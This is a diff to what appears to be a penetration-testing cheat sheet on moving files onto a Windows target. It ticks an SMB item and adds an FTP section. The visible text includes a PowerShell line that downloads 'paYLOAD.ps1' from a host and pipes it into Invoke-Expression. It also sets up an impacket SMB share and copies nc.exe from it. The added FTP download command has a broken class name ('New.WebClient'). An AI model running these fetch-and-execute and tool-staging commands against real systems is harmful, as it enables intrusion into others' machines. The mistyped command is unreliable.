@@ -62,7 +62,7 @@ Or just pipe it
 $client.DownloadString("10.10.10.16/paYLOAD.ps1") | IEX  
 ```
 
-- [ ] SMB DOWNLOADS
+- [x] SMB DOWNLOADS
 CREATE THE SMB SERVER THROUGH IMPACKET 
 ```
 sudo impacket-smbserver share -smb2support /tmp/smbshare
@@ -82,4 +82,18 @@ net use n: \\10.10.10.10\share /user:user pass
 then copy
 ```
 copy n:\nc.exe
+```
+
+- [ ] FTP DOWNLOADS 
+Use pyftpdlib
+```
+sudo pip3 install pyftpdlib
+```
+setup the server 
+```
+sudo python3 -m pyftpdlib --port 21
+```
+download 
+```
+(New-Object New.WebClient).DownloadFile('ftp://10.10.10.10/file.txt', 'C:\Users\Public\file.txt')
 ```
